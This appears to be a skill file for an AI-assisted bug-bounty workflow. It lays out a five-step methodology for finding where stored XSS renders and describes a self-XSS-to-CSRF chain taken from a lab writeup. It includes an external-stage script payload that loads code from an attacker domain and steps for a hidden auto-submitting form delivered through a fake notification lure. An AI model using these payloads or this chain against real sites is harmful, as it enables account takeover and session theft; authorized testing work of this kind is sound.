---
name: stored-xss-mapping-testing
description: Systematic stored-XSS surface mapping — the field where a payload is injected and the page(s) where it renders are frequently different, so this covers a five-step methodology (field inventory incl. overlooked non-obvious fields, per-field unique markers, exhaustive render-surface discovery across list/detail/export/email/print/embed/admin views, two-account self-XSS-vs-stored-XSS validation, and audience-based severity ranking) for finding every place a stored value actually detonates, not just the first one you happen to check. Use this during Phase 3 (Vulnerability Testing — Client-side) of bughunting-workflow on any target with persisted user-controlled data — profile fields, org/team names, filenames, webhook labels, API key descriptions, bulk-import paths, or anything else that gets written once and rendered in multiple places later. Distinct from `blind-xss-testing` (OOB-callback capture for genuinely invisible admin-panel/log rendering) and `csp-misconfig-xss-testing` (reflected/DOM XSS payload construction) — this skill is the discovery/mapping methodology for *visible* stored XSS across many rendering surfaces. Also trigger on mentions of stored XSS, persistent XSS, render surface, self-XSS vs stored XSS, or two-account XSS validation.
---

# Stored-XSS Surface Mapping

General technique library for systematically finding every place a piece of stored, user-controlled data actually renders — not just the input field's own page. Each dated entry below is a validated technique pulled from a real writeup/source — add new entries here (don't create a new skill) whenever a new writeup covers a *different* stored-XSS discovery or triage angle than what's already recorded.

## Core theory

The field where you inject and the page where it renders are two different things. A profile bio field might render on: the profile page itself, a public directory listing, a search-results snippet, an autocomplete dropdown, an email digest, a PDF export, a print view, a mobile app variant, and an internal admin/moderation queue — each with its own (possibly inconsistent) output-encoding logic. Testing only the page where you typed the payload misses every other surface, and those other surfaces are frequently the ones that actually escape encoding, since they're maintained by different code paths (a PDF generator, an email templating engine, an export library) that the team securing the primary UI never audited.

## Trigger technique: five-step mapping process

1. **Field inventory.** List every writable input on the target, deliberately prioritizing the *overlooked* ones over the obvious profile/bio field — organization/team name, filename on upload, webhook label, API key description, custom field names, and bulk-import paths (CSV/JSON import). Import paths in particular frequently skip validation the primary UI form applies, since the import parser and the UI form are usually different code.
2. **Per-field unique markers.** Don't reuse one canary string across fields — tag each field with its own traceable marker (e.g. `nitnbio01` for bio, `nitnorg02` for org name, incrementing per field). When a payload later shows up somewhere unexpected, the marker alone tells you which field it came from without re-testing.
3. **Render-surface discovery.** Systematically check every place content *could* render, not just the obvious one:
   - List/detail/search views and autocomplete dropdowns
   - Email and notification templates
   - Exports: CSV, PDF, XLSX
   - Print modes, embeds, mobile app variants
   - Admin/audit-log/moderation interfaces
   PDF generators in particular are frequently headless browsers under the hood — HTML injection there can escalate past XSS into SSRF (the headless browser fetching attacker-controlled resources) or local-file-read via `file://` sources, so treat a PDF-export render hit as a separate, higher-priority finding to dig into rather than just another XSS confirmation.
4. **Two-account validation.** Inject as Account A, then check whether the payload renders when viewed from Account B (a separate session/user with legitimate visibility into A's content — a teammate, an admin, a public viewer). If it only ever renders back to the account that submitted it, it's self-XSS (informational, needs a chaining primitive like CSRF to be reportable) — not stored XSS. This separation is the single most common self-XSS/stored-XSS triage mistake worth avoiding before writing up a finding.
5. **Audience-based severity ranking.** Once confirmed as genuinely stored (not self-XSS), rank severity by who can be forced to view it, not by the injection technique itself:
   - **Informational** — marker renders but is fully escaped everywhere (proves the field is stored/rendered, not that it's exploitable)
   - **Low** — self-only stored XSS (needs chaining, e.g. a CSRF that gets a victim to view the attacker's own content)
   - **Medium** — visible to invited/connected users only (teammates, shared-project members)
   - **High** — visible on any authenticated-user-reachable surface with no interaction required beyond normal use
   - **Critical** — crosses a tenant/organization boundary, or renders on a staff/admin-only surface

## Practical notes

- **Payload construction:** use short payloads that load an external stage (`<script src=//yourdomain/x.js>`) rather than a long inline payload, since many of the overlooked fields from step 1 (filenames, org names, webhook labels) have tight length limits that truncate a self-contained payload before it can execute.
- **Finding hits without watching every page manually:** use browser find-in-page for markers visible in rendered text, and view-source/DevTools inspection for markers hidden in non-visible DOM locations — `title` attributes, `data-*` attributes, and embedded JSON blobs (a marker landing unescaped inside a `<script>`-embedded JSON config is a distinct, often-missed sink from the visible-text case).
- **Operational hygiene:** remove every stored payload once you have your screenshots/evidence — a forgotten test payload left live in a shared/multi-tenant field is a real risk to other users and to the program's trust in future submissions. If a payload turns up somewhere you didn't expect (a render surface you hadn't deliberately tested), stop and report it rather than continuing to experiment in production — the unexpected location is itself the interesting finding.

## Recorded techniques

### 1. Field inventory → per-field markers → render-surface sweep → two-account triage → audience severity ranking
Source: [Stored XSS: Mapping Where User Content Actually Renders](https://medium.com/@kd-200/stored-xss-mapping-where-user-content-actually-renders-a50910f76045)

**Where:** any target with persisted user-controlled data rendered across more than one surface — covered fully in Core theory and Trigger technique above; this entry is the origin source for the whole methodology in this skill.

**Generalize note:** cross-reference `hidden-parameter-discovery-testing` for finding additional writable fields beyond what the visible UI form exposes (the same "overlooked fields" principle as step 1's bulk-import-path point, applied to API parameters rather than form fields), and `blind-xss-testing` when a render surface from step 3 turns out to be genuinely invisible to you (an internal admin panel you have no account for) rather than just a second surface you can view with a second test account — that's when OOB-callback capture becomes necessary instead of direct two-account viewing.

### 2. Self-XSS → real stored XSS via CSRF-forced profile-update submission
Source: [Turning a "Harmless" Self-XSS into a Full Profile Takeover](https://freedium-mirror.cfd/https://medium.com/@oopssec-store/turning-a-harmless-self-xss-into-a-full-profile-takeover-d06cac1c50c3)

**Where:** the exact self-XSS/CSRF chain step 4's triage note above only describes abstractly — this entry is the concrete worked exploit for it. A profile bio field rendered via React's `dangerouslySetInnerHTML` with no sanitization (DOMPurify absent) only ever detonates back to the submitting account (confirmed self-XSS via the two-account check), while the profile-update endpoint (`POST /api/user/profile`) has no CSRF token, no `Origin` header check, and only a weak/Referer-based check — auth relies solely on an HTTP-only session cookie with no `SameSite=Strict` protecting it.

**Root cause:** two independently-moderate bugs, neither reportable alone, that compound into full account compromise: (1) unsafe HTML rendering (XSS) that only affects the account that submits the payload, and (2) a state-changing endpoint with no real CSRF protection (`SameSite` too permissive, no synchronizer token, Referer checked but not enforced against the expected origin). Self-XSS alone is informational because the victim would have to knowingly inject the payload into their own session; CSRF alone is unexploitable here because there's no sensitive state to force *other than* setting attacker-controlled content that then needs a place to execute. Combined, the CSRF primitive supplies exactly the missing "force the victim to submit this without their awareness" step the self-XSS finding needed.

**Exploit steps:**
1. Confirm the bio field is self-XSS only (two-account check per step 4 above): payload saved by Account A renders when A views their own profile, not when B views it.
2. Confirm the profile-update endpoint's CSRF gap: submit a request to `POST /api/user/profile` from a page hosted on attacker-controlled infrastructure (not the app's own origin) and confirm it's accepted rather than rejected — a Referer check that only inspects *whether* a Referer header is present, or checks it loosely, rather than validating it equals the app's own origin, is what makes this step succeed.
3. Build a hidden auto-submitting HTML form on an attacker-controlled page, targeting `POST /api/user/profile` with the XSS payload as the bio value and `credentials: "include"` (or an ordinary form submission, which attaches cookies automatically) so the victim's own session cookie authenticates the forged request.
4. Deliver the page to the victim disguised as a plausible click target (the source used a fake "View Profile" button styled as a LinkedIn notification) while the victim is authenticated to the target app in the same browser.
5. On click, the hidden form silently submits, overwriting the victim's own bio with the attacker's payload — the victim's browser, not the attacker's, performs the profile update, so it passes any same-account/ownership check the endpoint has.
6. The payload now executes the next time the victim (or anyone else who can view that profile) visits it — self-XSS has been converted into a real, attacker-triggered stored-XSS hit against the victim's own account.

**Impact:** full account compromise via arbitrary JavaScript execution in the victim's authenticated session — session/token theft, further CSRF chaining, or any other post-XSS action the app's session allows. Note this specific source used a deliberately vulnerable lab app (not a live bounty target); apply the technique's shape (self-XSS + CSRF-forceable submission = reportable chain) but don't treat the impact narrative or bounty framing as coming from a real program.

**Generalize:** whenever step 4's two-account check confirms a payload is self-XSS-only, don't discard the finding — immediately test the *same submitting endpoint* for CSRF (missing/weak token validation, `Origin`/`Referer` not strictly enforced, `SameSite` not `Strict`) before writing the self-XSS off as informational. This is the standard chain-completion move for exactly the gap this skill's severity-ranking table already flags at the Low tier ("self-only stored XSS — needs chaining, e.g. a CSRF that gets a victim to view the attacker's own content"). Cross-reference `csp-misconfig-xss-testing`'s identical self-XSS caveat and `vibe-coded-app-testing`'s `dangerouslySetInnerHTML` detection entry for the React-specific sink-finding half of this chain (`grep` the bundle for `dangerouslySetInnerHTML` to find candidate fields before doing the two-account/CSRF work above).

<!-- Add new recorded techniques below this line as new stored-XSS-mapping writeups are processed. Keep the same structure: Where / Root cause / Exploit steps / Impact framing / Generalize note. -->
